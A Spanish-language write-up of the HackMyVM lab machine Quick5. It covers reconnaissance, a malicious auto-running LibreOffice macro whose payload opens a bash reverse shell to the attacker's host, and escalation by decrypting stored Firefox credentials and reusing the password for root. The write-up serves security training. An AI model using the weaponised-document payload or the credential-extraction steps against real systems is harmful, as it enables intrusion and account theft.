# Writeup: Quick5 (HackMyVM)

---

## 1. Escaneo y Reconocimiento

### Escaneo de Puertos con Nmap
Iniciamos con un escaneo completo de puertos TCP para identificar los servicios expuestos en la máquina objetivo:

```bash
nmap -p- --open -sSCV -n -Pn 192.168.0.27 -oN tcpScan
```

* **Puerto 22/tcp:** Servicio SSH corriendo `OpenSSH 8.9p1 Ubuntu 3ubuntu0.6`. Al tratarse de una versión superior a la 7.7, no es posible la enumeración directa de usuarios a través del servicio.
* **Puerto 80/tcp:** Servidor web `Apache httpd 2.4.52` que aloja el sitio *Quick Automative - Home*.

### Reconocimiento Web
Ejecutamos `whatweb` sobre el servicio HTTP para extraer tecnologías e información clave:

```bash
whatweb http://192.168.0.27
```

* **Tecnologías detectadas:** Apache 2.4.52, Bootstrap 4, jQuery 3.4.1 y HTML5.
* **Correos identificados:** `book@quick.hmv`, `info@quick.hmv` y `tech@quick.hmv`.
* **Dominio objetivo:** `quick.hmv`.

Al examinar manualmente la aplicación web destacan los siguientes hallazgos:
* Se muestran los nombres de 8 empleados, idóneos para construir un diccionario de usuarios potenciales.
* Existen dos formularios de contacto que permiten enviar mensajes, representando posibles vectores para probar inyecciones.
* Al inspeccionar los enlaces mediante el cursor, se revelan los subdominios `careers.quick.hmv` y `customer.quick.hmv`.

Procedemos a incluir los dominios encontrados en el archivo `/etc/hosts`:

```text
192.168.0.27 quick.hmv careers.quick.hmv customer.quick.hmv
```

Al visitar `customer.quick.hmv`, se observa un aviso de mantenimiento por un incidente de seguridad previo, insinuando la posible presencia de un *backdoor* o punto de entrada no remediado.

### Fuzzing de Virtual Hosts (VHosts)
Realizamos enumeración de subdominios con `gobuster` para localizar otros vhosts activos:

```bash
gobuster vhost -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://quick.hmv -r --append-domain
```

* **Subdominio descubierto:** `employee.quick.hmv` (Status 200).
* Tras añadirlo a `/etc/hosts`, constatamos que despliega el mismo mensaje de mantenimiento registrado en `customer.quick.hmv`.

---

## 2. Acceso Inicial (Foothold)

En el portal `careers.quick.hmv`, los candidatos pueden adjuntar archivos en formato `.odt` o `.pdf` para aplicar a vacantes. Dado que estos documentos son procesados posteriormente por personal interno, se presenta un vector de ejecución de macros maliciosas.

### Creación del Documento Malicioso
1. Abrimos LibreOffice Writer, añadimos texto cualquiera y creamos una nueva macro.
2. Agregamos el payload para obtener una Shell Inversa:

```basic
Sub Main
    shell("bash -c 'bash -i >& /dev/tcp/192.168.0.43/443 2>&1'")
End Sub
```

3. Configuramos el evento para que la macro se ejecute automáticamente al abrir el archivo y guardamos el documento en formato `.odt`.

### Explotación
Levantamos un oyente con `netcat` en nuestra máquina atacante y subimos el archivo a la web:

```bash
nc -lvnp 443
```

Tras unos momentos, el archivo es procesado en la máquina víctima y recibimos una conexión reversa como el usuario **andrew**, lo que nos permite leer la primera flag.

---

## 3. Escalada de Privilegios

### Enumeración Local
Iniciamos la revisión del sistema en búsqueda de credenciales. Al ejecutar:

```bash
grep -r "pass" / 2>/dev/null
```

Aunque se genera un gran volumen de información, destaca al inicio de la salida el archivo de perfil de Firefox:

`/home/andrew/snap/firefox/common/.mozilla/firefox/ii990jpt.default/logins.json`

![Captura de logins.json](quick-2.jpg)

Este archivo contiene los campos `encryptedUsername` y `encryptedPassword`.

### Extracción de Credenciales Almacenadas
Para descifrar los datos de Firefox empleamos la herramienta [firefox_decrypt](https://github.com/unode/firefox_decrypt).

Debido a que Firefox se encuentra instalado mediante Snap, ubicamos manualmente la ruta del archivo `profiles.ini`:

`/home/andrew/snap/firefox/common/.mozilla/firefox/profiles.ini`

Ejecutamos el script proporcionando el directorio base de la instalación:

```bash
./firefox_decrypt.py /home/andrew/snap/firefox/common/.mozilla/firefox
```

**Credenciales recuperadas:**
* **Sitio Web:** `http://employee.quick.hmv`
* **Usuario:** `andrew.speed@quick.hmv`
* **Contraseña:** `SuperSecretPassword`

### Elevación a Root
Comprobamos la reutilización de credenciales probando la clave obtenida (`SuperSecretPassword`) con el usuario **root**. La autenticación resulta exitosa y obtenemos acceso total con privilegios elevados junto a la flag final.
